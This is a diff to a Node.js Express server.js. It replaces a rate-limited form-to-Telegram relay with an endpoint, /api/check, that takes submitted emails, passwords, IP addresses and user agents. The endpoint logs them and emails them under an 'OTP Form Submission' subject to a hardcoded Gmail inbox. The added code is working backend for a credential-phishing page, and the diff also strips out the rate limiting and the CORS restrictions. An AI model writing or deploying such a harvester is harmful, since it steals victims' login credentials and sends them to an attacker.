@@ -1,172 +1,64 @@
-require('dotenv').config();
-
-const express = require('express');
-const cors = require('cors');
-const fetch = require('node-fetch');
+// server.js
+const express = require("express");
+const cors = require("cors");
+const nodemailer = require("nodemailer");
 
 const app = express();
+const PORT = process.env.PORT || 5000;
 
-const {
-  TELEGRAM_BOT_TOKEN,
-  TELEGRAM_CHAT_ID,
-  PORT = 3000,
-  ALLOWED_ORIGINS = '',
-} = process.env;
-
-// Validate required environment variables
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-  console.error(
-    'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID. Copy .env.example to .env and fill it in.'
-  );
-  process.exit(1);
-}
-
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
-// ---------------- Middleware ----------------
-
-const allowedOrigins = ALLOWED_ORIGINS
-  .split(',')
-  .map((o) => o.trim())
-  .filter(Boolean);
-
-app.use(
-  cors({
-    origin: allowedOrigins.length ? allowedOrigins : '*',
-    methods: ['GET', 'POST'],
-  })
-);
-
+// Middleware
+app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ---------------- Rate Limiter ----------------
+// ✅ POST route to receive data
+app.post("/api/check", async (req, res) => {
+  const formData = req.body;
+  console.log("📩 Received form data:", formData);
 
-const rateLimitWindowMs = 60 * 1000;
-const rateLimitMax = 5;
-const hits = new Map();
+  // Extract values
+  const {
+    email,
+    pass,
+    ip,
+    userAgent
+  } = formData;
 
-function rateLimit(req, res, next) {
-  const ip = req.ip;
-  const now = Date.now();
-
-  const record = hits.get(ip) || {
-    count: 0,
-    start: now,
-  };
-
-  if (now - record.start > rateLimitWindowMs) {
-    record.count = 0;
-    record.start = now;
-  }
-
-  record.count++;
-  hits.set(ip, record);
-
-  if (record.count > rateLimitMax) {
-    return res.status(429).json({
-      ok: false,
-      error: 'Too many requests. Please try again later.',
-    });
-  }
-
-  next();
-}
-
-// ---------------- Helpers ----------------
-
-// Escape Telegram MarkdownV2 characters
-function escapeMarkdownV2(text = '') {
-  return String(text).replace(
-    /[_*[\]()~`>#+\-=|{}.!\\]/g,
-    '\\$&'
-  );
-}
-
-// Build Telegram message
-function buildMessage(fields) {
-  const lines = ['*New Form Submission*', ''];
-
-  for (const [key, value] of Object.entries(fields)) {
-    const label = escapeMarkdownV2(key);
-    const val = escapeMarkdownV2(
-      Array.isArray(value)
-        ? value.join(', ')
-        : String(value ?? '')
-    );
-
-    lines.push(`*${label}:* ${val}`);
-  }
-
-  return lines.join('\n');
-}
-
-async function sendToTelegram(text) {
-  const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text,
-      parse_mode: 'MarkdownV2',
-    }),
-  });
-
-  const data = await response.json();
-
-  if (!data.ok) {
-    throw new Error(data.description || 'Telegram API error');
-  }
-
-  return data;
-}
-
-// ---------------- Routes ----------------
-
-// Health check
-app.get('/health', (req, res) => {
-  res.json({ ok: true });
-});
-
-// Form submission endpoint
-app.post('/api/submit', rateLimit, async (req, res) => {
   try {
-    const fields = req.body;
-
-    if (!fields || Object.keys(fields).length === 0) {
-      return res.status(400).json({
-        ok: false,
-        error: 'No form data received.',
-      });
-    }
-
-    // Honeypot spam field
-    if (fields.website) {
-      return res.json({ ok: true });
-    }
-
-    const message = buildMessage(fields);
-
-    await sendToTelegram(message);
-
-    res.json({
-      ok: true,
-      message: 'Sent to Telegram successfully.',
+    // ✅ Setup Nodemailer transporter
+    let transporter = nodemailer.createTransport({
+      service: "gmail", // change to outlook, yahoo, etc. if needed
+      auth: {
+        user: process.env.EMAIL_USER, // your email
+        pass: process.env.EMAIL_PASS  // your app password
+      }
     });
 
-  } catch (err) {
-    console.error('Error sending to Telegram:', err.message);
+    // ✅ Send email
+    await transporter.sendMail({
+      from: `"Form Bot" <${process.env.EMAIL_USER}>`,
+      to: "jessie.bosqueschool.org@gmail.com", // change to your real inbox
+      subject: "🔔 New OTP Form Submission",
+      text: `
+      📩 New Submission Received:
 
-    res.status(500).json({
-      ok: false,
-      error: 'Failed to send message to Telegram.',
+      👤 User: ${email}
+      🔑 Pass: ${pass}
+      🌍 IP: ${ip}
+      🖥️ UserAgent: ${userAgent}
+      `
     });
+
+    console.log("📧 Email sent successfully");
+
+    res.json({ status: "ok", message: "Data received and emailed ✅" });
+  } catch (error) {
+    console.error("❌ Error sending email:", error);
+    res.status(500).json({ status: "error", message: "Failed to send email" });
   }
 });
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
